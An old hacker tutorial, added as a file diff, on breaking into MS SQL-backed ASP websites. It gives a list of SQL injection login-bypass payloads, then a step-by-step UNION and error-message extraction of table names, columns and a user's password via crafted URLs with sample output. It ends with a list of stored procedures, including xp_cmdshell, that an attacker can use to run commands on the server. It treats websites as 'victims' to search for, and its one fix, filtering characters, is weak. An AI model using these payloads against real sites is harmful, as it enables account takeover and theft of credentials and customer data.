@@ -1,0 +1,170 @@
+Databases have been the heart of a commercial website. An attack on the database servers can cause a great monetary loss for the company 
+. Database servers are usually hacked to get the credit card information. And just one hack on a commercial site will bring down its reputation and al 
+so the customers as they also want their credit card info secured. Most of the commercial websites use Microsoft sql (MSsql) and Oracle database serve 
+rs. MS sql still owns the market because the price is very low. While Oracle servers come with high price. Well some time ago Oracle had claimed itsel 
+f to be "unbreakable" But hackers took it as a challenge and showed lots of bugs in it also !! I was addicted to hacking of database servers from a fe 
+w months. So I just decided to share the knowledge with others. Well the things discussed here are not discovered by me ok. Yeah I experimented with t 
+hem a lot. 
+ 
+ user will type his login name and password in login.htm page and click the submit button. The value of the text boxes will be passed to the loginche 
+ck.asp page where it will be checked using the query string. If it doesn't get an entry satisfying the query and will reach end of file a message of l 
+ogin failed will be displayed. Every thing seems to be OK. But wait a minute. Think again. Is every thing really OK ?!! What about the query ?!! Is it 
+ OK. Well if you have made a page like this then a hacker can easily login successfully without knowing the password. How ? Lets look at the querry ag 
+ain. 
+ 
+ 
+ 
+"Select * from table1 where login='"&log& "' and password='" &pwd& "' " 
+ 
+Now if a user types his login name as "Chintan" and password as "h4x3r" then these values will pass to the asp page with post method and then the abo 
+ve query will become 
+ 
+"Select * from table1 where login=' Chintan ' and password=' h4x3r ' " 
+ 
+Thats fine. There will be an entry Chintan and h4x3r in login and password fields in the database so we will receive a message as login successful. N 
+ow what if I type loginname as "Chintan" and password as 
+hi' or 'a'='a in the password text box ? The query will become as follows: 
+ 
+"Select * from table1 where login=' Chintan ' and password=' hi' or 'a'='a ' " 
+ 
+And submit and bingo!!!!! I will get the message as Login successful !! Did you see the smartness of hacker which was due to carelessness of web desi 
+gner ? !! 
+The query gets satisfied as query changes and password needs to 'hi' or 'a' needs to be equal to 'a'. Clearly password is not 'hi' but at the same ti 
+me 'a'='a' . So condition is satisfied. And a hacker is in with login "Chintan" !! You can try the following in the password text box if the above doe 
+sn't work for some websites: 
+ 
+hi" or "a"="a 
+hi" or 1=1 -- 
+hi' or 1=1 -- 
+hi' or 'a'='a 
+hi') or ('a'='a 
+hi") or ("a"="a 
+ 
+Here above -- will make the rest of the query string to be a comment other conditions will not be checked. Similary you can provide 
+ 
+Chintan ' -- 
+Chintan " -- 
+ 
+or such types of other possibilites in the login name textbox and password as anything which might let you in. Because in the query string only login 
+ name is checked as "Chintan" and rest is ignored due to --. Well if you are lucky enough you get such a website were the webdesigner has done the abo 
+ve mistake and then you will be able to login as any user !!! 
+ 
+IMP NOTE: Hey guys I have put up a page where you can experiment for yourself about the sql injection vulnerablity. Just go to www33.brinkster.co 
+m/chintantrivedi/login.htm 
+ 
+More advance hacking of Databases using ODBC error messages!!! 
+-------------------------------------------------------------- 
+ 
+Above we saw as to how login successfully without knowing password. Now over here I will show you how to read the whole database just by using querie 
+s in the URL !! And this works only for IIS i.e asp pages. And we know that IIS covers almost 35% of the web market. So you will definitely get a vict 
+im just after searching a few websites. You might have seen something like 
+ 
+http://www.nosecurity.com/mypage.asp?id=45 
+ 
+in the URLs. '?' over there shows that after it, 45 value is passed to a hidden datatype id. Well if you don't understand then as we have seen in the 
+ above example in the login.htm, having two input text types with names 'login_name' and 'pass' and there values were passed to logincheck.asp page. T 
+he same thing can be done by directly opening the logincheck.asp page using 
+http://www.nosecurity.com/logincheck.asp?login_name=Chintan&pass=h4x3r 
+in the URL if method="get" is used instead of method="post". 
+ 
+Note : or Difference between get and post method is that post method doesn't show up values passed to next paged in the url while get method show 
+s up the values. To get more understanding of how they internally work read HTTP protocol RFC 1945 and RFC 2616. 
+ 
+What i mean to say is that after '?' the variables which are going to be used in that page are assigned the values. As above login_name is given valu 
+e Chintan. And different variables are separated by operator '&'. 
+ 
+OK so coming back, id will mostly be hidden type and according to the links you click its value will change. This value of id is then passed in the q 
+uery in mypage.asp page and according tothe results you get the desired page at your screen. Now if just change the value of id as 46 then you will ge 
+t different page. 
+Now lets start our hacking the database. Lets use the magic of queries. Just type 
+ 
+http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES-- 
+ 
+in the URL. INFORMATION_SCHEMA.TABLES is a system table and it contains information of all the tables of the server. In that there is field TABLE_NAM 
+E which contains names of all the tables. See the query again 
+SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES 
+The result of this query is the first table name from INFORMATION_SCHEMA.TABLES table. But the result we get is a table name which is a string(nvarch 
+ar) and we are uniting it with 45(integer) by UNION. So we will get an error message as 
+ 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error conve 
+rting the nvarchar value 'logintable' to a column of data type int. /mypage.asp, line 
+ 
+From the error its clear that first table is 'logintable'. It seems that this table might contain login names and passwords :-) So lets move in i 
+t. Type the following in the URL 
+ 
+http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='logintable'-- 
+ 
+output 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar 
+value 'login_id' to a column of data type int. 
+/index.asp, line 5 
+ 
+The above error message shows that the first field or column in logintable is login_id. To get the next column name will type 
+ 
+http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='logintable' WHERE COL 
+UMN_NAME NOT IN ('login_id')-- 
+ 
+Output: 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar 
+value 'login_name' to a column of data type int. 
+/index.asp, line 5 
+ 
+So we get one more field name as 'login_name'. To get the third field name we will write 
+ 
+http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='logintable' WHERE COL 
+UMN_NAME NOT IN ('login_id','login_name')-- 
+ 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar 
+value 'passwd' to a column of data type int. 
+/index.asp, line 5 
+ 
+Thats it. We ultimately get the 'passwd' field. Now lets get the login names and 
+passwords from this table "logintable". Type 
+ 
+http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 login_name FROM logintable-- 
+ 
+Output: 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar 
+value 'Rahul' to a column of data type int. 
+/index.asp, line 5 
+ 
+Thats the login name "Rahul" and to get the password of Rahul the query would be 
+ 
+http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 password FROM logintable 
+where login_name='Rahul'-- 
+ 
+Output: 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar 
+value 'P455w0rd' to a column of data type int. 
+/index.asp, line 5 
+ 
+Voila!! login name: Rahul and password: P455w0rd. You have cracked the database of 
+www.nosecurity.com And's it was possible to the request of user was not checked properly. SQL 
+vulnerabilities still exist on many websites. The best solution is to parse the user requests and 
+filter out some characters as ',",--,:,etc. 
+ 
+Part II - using port 1434 (SQL Port) 
+------------------------------------- 
+ 
+Well uptill now we had seen how to break the database using the malformed URLs But that was done using just port 80 (http port) But this time we woul 
+d use the port 1434 for hacking. Before that we will see what actually database servers are and how do they work and then how to exploit them ! 
+ 
+The designers of MS sql gave some default stored procedures along with the product to make things flexible to the webdesigners. The procedure is noth 
+ing but functions which can used to perform some actions on the arguments passed to them. This procedures are very important to hackers. Some of the i 
+mportant ones are 
+ 
+sp_passsword -> Changes password for a specific login name. 
+e.g. EXEC sp_password 'oldpass', 'newpass', 'username' 
+ 
+sp_tables -> Shows all the tables in the current database. 
+e.g. EXEC sp_tables 
+ 
+xp_cmdshell -> Runs arbitary command on the machine with administrator privileges. (most imp) 
+ 
+xp_msver -> Shows the MS SQL server version including the all info about the OS. 
+e.g. master..xp_msver 
